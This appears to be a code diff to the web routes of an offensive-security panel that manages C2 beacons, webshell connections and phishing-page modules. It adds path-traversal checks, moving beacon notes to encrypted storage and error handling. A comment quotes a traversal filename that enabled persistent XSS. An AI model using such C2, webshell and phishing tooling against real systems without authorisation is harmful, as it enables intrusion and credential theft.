@@ -1,6 +1,7 @@
 """C2 管理 + WebShell 管理 + 钓鱼页面路由。"""
 import json
 import os
+import re
 import time
 from datetime import datetime
 from typing import Any, Dict
@@ -13,7 +14,33 @@ from flowscan import webshell as ws
 from flowscan import phishing_bridge
 from flowscan.config import load_yaml
 
+from . import secure_store
 from ._common import _to_bool, login_required
+
+
+_JS_FILENAME_RE = re.compile(r"^[A-Za-z0-9_][A-Za-z0-9_.-]*$")
+
+
+def _js_module_path(modules_dir: str, name: str):
+    """校验钓鱼模块文件名为纯文件名(.js 结尾、无路径分隔/穿越),返回绝对路径。
+
+    非法返回 None。此前只查 endswith(".js"),`../../web_app/static/x.js`
+    可写入静态目录(持久 XSS),2026-09-28 修复。
+    """
+    if not name or not name.endswith(".js") or not _JS_FILENAME_RE.match(name):
+        return None
+    path = os.path.abspath(os.path.join(modules_dir, name))
+    if os.path.dirname(path) != os.path.abspath(modules_dir):
+        return None
+    return path
+
+
+def _c2_state_or_error():
+    """读面板加密状态(备注/隐藏所在)。返回 (state, err_response)。"""
+    try:
+        return secure_store.SecureStore().get_state(), None
+    except secure_store.StoreError as exc:
+        return None, {"ok": False, "error": f"面板状态读取失败: {exc}"}
 
 
 def _safe_int_arg(name: str, default: int = 100) -> int:
@@ -163,7 +190,10 @@ def register(app):
             url = (data.get("url") or "").strip()
             if not url:
                 return jsonify({"ok": False, "error": "url is required"}), 400
-            conn = ws.create_connection(redis, data)
+            try:
+                conn = ws.create_connection(redis, data)
+            except ws.WebshellError as exc:
+                return jsonify({"ok": False, "error": str(exc)}), 400
             return jsonify({"ok": True, "connection": _ws_safe(conn)})
         return jsonify({"ok": True, "connections": [_ws_safe(c) for c in ws.list_connections(redis)]})
 
@@ -302,13 +332,15 @@ def register(app):
             return jsonify({"ok": False, "error": "C2 未启用"}), 400
         c2_bridge.init_c2(c2cfg["project_root"], c2cfg["config_file"])
         beacons = c2_bridge.list_beacons()
-        # 合并备注 + 隐藏状态(Redis)
-        redis = app.config["get_redis"]()
-        hidden = set(redis.conn.zrange("fs3:c2:hidden", 0, -1) or [])
+        # 合并备注 + 隐藏状态(2026-09-28: 从 Redis 改到面板加密存储, 重启不丢)
+        state, err = _c2_state_or_error()
+        if err:
+            return jsonify(err), 500
+        remarks, hidden = state["remarks"], state["hidden"]
         for b in beacons:
             bid = b.get("client_id", "")
             if bid:
-                b["remark"] = redis.conn.get(f"fs3:c2:remark:{bid}") or ""
+                b["remark"] = remarks.get(bid, "")
                 b["hidden"] = bid in hidden
         return jsonify({"ok": True, "beacons": beacons})
 
@@ -324,7 +356,10 @@ def register(app):
         if not c2_bridge.get_beacon(client_id):
             return jsonify({"ok": False, "error": "beacon not found"}), 404
         redis = app.config["get_redis"]()
-        redis.conn.zadd("fs3:c2:hidden", {client_id: time.time()})
+        try:
+            secure_store.SecureStore().set_hidden(client_id, True)
+        except secure_store.StoreError as exc:
+            return jsonify({"ok": False, "error": f"隐藏失败: {exc}"}), 500
         _c2_audit(redis, f"hide beacon {client_id}", "ok")
         return jsonify({"ok": True, "hidden": True})
 
@@ -337,7 +372,10 @@ def register(app):
         if not c2cfg["enabled"]:
             return jsonify({"ok": False, "error": "C2 未启用"}), 400
         redis = app.config["get_redis"]()
-        redis.conn.zrem("fs3:c2:hidden", client_id)
+        try:
+            secure_store.SecureStore().set_hidden(client_id, False)
+        except secure_store.StoreError as exc:
+            return jsonify({"ok": False, "error": f"恢复失败: {exc}"}), 500
         _c2_audit(redis, f"unhide beacon {client_id}", "ok")
         return jsonify({"ok": True, "hidden": False})
 
@@ -377,8 +415,11 @@ def register(app):
         except Exception:
             expire = 86400
         by_id = {b["client_id"]: b for b in c2_bridge.list_beacons()}
+        state, err = _c2_state_or_error()
+        if err:
+            return jsonify(err), 500
         out = []
-        for bid, score in redis.conn.zrange("fs3:c2:hidden", 0, -1, withscores=True) or []:
+        for bid, score in state["hidden"].items():
             b = by_id.get(bid)
             if not b:
                 continue  # 已被清理线程移除
@@ -648,9 +689,6 @@ def register(app):
             c2_bridge.init_c2(c2cfg["project_root"], c2cfg["config_file"])
         return c2cfg
 
-    def _beacon_remark_key(bid: str) -> str:
-        return f"fs3:c2:remark:{bid}"
-
     @app.route("/api/c2/status-detail")
     @login_required
     def c2_status_detail():
@@ -675,10 +713,11 @@ def register(app):
         data = c2_bridge.beacon_detail(client_id)
         if not data.get("ok"):
             return jsonify(data), 404
-        redis = app.config["get_redis"]()
+        state, err = _c2_state_or_error()
+        if err:
+            return jsonify(err), 500
         bid = data["beacon"].get("client_id", client_id)
-        remark = redis.conn.get(_beacon_remark_key(bid))
-        data["beacon"]["remark"] = remark or ""
+        data["beacon"]["remark"] = state["remarks"].get(bid, "")
         return jsonify(data)
 
     @app.route("/api/c2/beacon/<client_id>/tasks")
@@ -718,16 +757,17 @@ def register(app):
     def c2_beacon_remark(client_id: str):
         if not _ensure_c2():
             return jsonify({"ok": False, "error": "C2 未启用"}), 400
-        redis = app.config["get_redis"]()
-        key = _beacon_remark_key(client_id)
         if request.method == "GET":
-            return jsonify({"ok": True, "remark": redis.conn.get(key) or ""})
+            state, err = _c2_state_or_error()
+            if err:
+                return jsonify(err), 500
+            return jsonify({"ok": True, "remark": state["remarks"].get(client_id, "")})
         data = request.get_json(silent=True) or {}
         remark = str(data.get("remark", "") or "").strip()[:500]
-        if remark:
-            redis.conn.set(key, remark)
-        else:
-            redis.conn.delete(key)
+        try:
+            secure_store.SecureStore().set_remark(client_id, remark)
+        except secure_store.StoreError as exc:
+            return jsonify({"ok": False, "error": f"备注保存失败: {exc}"}), 500
         return jsonify({"ok": True, "remark": remark})
 
     @app.route("/api/c2/audit")
@@ -812,6 +852,15 @@ def register(app):
             redis.conn.ltrim("fs3:phishing:audit", -1000, -1)
         except Exception:
             pass
+
+    def _ensure_phishing_for_start():
+        """显式启动专用:先清失败冷却再走 _ensure_phishing。
+
+        否则启动失败后 30s 内点「启动」会被冷却短路,面板显示上次的旧错误
+        (2026-09-28)。读路径仍走 _ensure_phishing,保留冷却避免每次 5s 空转。
+        """
+        phishing_bridge.clear_fail_cooldown()
+        return _ensure_phishing()
 
     def _ensure_phishing():
         """启用检查 + 懒加载 + 回传挂载,返回 ph_cfg 或 None。"""
@@ -1010,15 +1059,15 @@ def register(app):
         data = request.get_json(silent=True) or {}
         filename = str(data.get("filename", "") or "").strip()
         content = str(data.get("content", "") or "")
-        if not filename.endswith(".js"):
-            return jsonify({"ok": False, "error": "只允许 .js 模块文件"}), 400
-        if "// MODULE =" not in content:
-            return jsonify({"ok": False, "error": "模块内容必须包含 // MODULE = {...} 元数据头"}), 400
         srv = phishing_bridge.get_phishing()
         modules_dir = srv._loader._modules_dir if srv else None
         if not modules_dir:
             return jsonify({"ok": False, "error": "phishing 未启动"}), 400
-        path = os.path.join(modules_dir, filename)
+        path = _js_module_path(modules_dir, filename)
+        if path is None:
+            return jsonify({"ok": False, "error": "文件名不合法(只允许 .js,禁止路径分隔符)"}), 400
+        if "// MODULE =" not in content:
+            return jsonify({"ok": False, "error": "模块内容必须包含 // MODULE = {...} 元数据头"}), 400
         try:
             with open(path, "w", encoding="utf-8") as f:
                 f.write(content)
@@ -1033,13 +1082,13 @@ def register(app):
     def phishing_module_delete(filename: str):
         if not _ensure_phishing():
             return jsonify({"ok": False, "error": "钓鱼页面未启用"}), 400
-        if not filename.endswith(".js"):
-            return jsonify({"ok": False, "error": "只允许删除 .js 模块文件"}), 400
         srv = phishing_bridge.get_phishing()
         modules_dir = srv._loader._modules_dir if srv else None
         if not modules_dir:
             return jsonify({"ok": False, "error": "phishing 未启动"}), 400
-        path = os.path.join(modules_dir, filename)
+        path = _js_module_path(modules_dir, filename)
+        if path is None:
+            return jsonify({"ok": False, "error": "文件名不合法(只允许 .js,禁止路径分隔符)"}), 400
         if not os.path.isfile(path):
             return jsonify({"ok": False, "error": f"模块 {filename} 不存在"}), 404
         try:
@@ -1053,7 +1102,7 @@ def register(app):
     @app.route("/api/phishing/start", methods=["POST"])
     @login_required
     def phishing_start():
-        if not _ensure_phishing():
+        if not _ensure_phishing_for_start():
             return jsonify({"ok": False, "error": "钓鱼页面未启用"}), 400
         ok, msg = phishing_bridge.start()
         _ph_audit(app.config["get_redis"](), "start", msg)
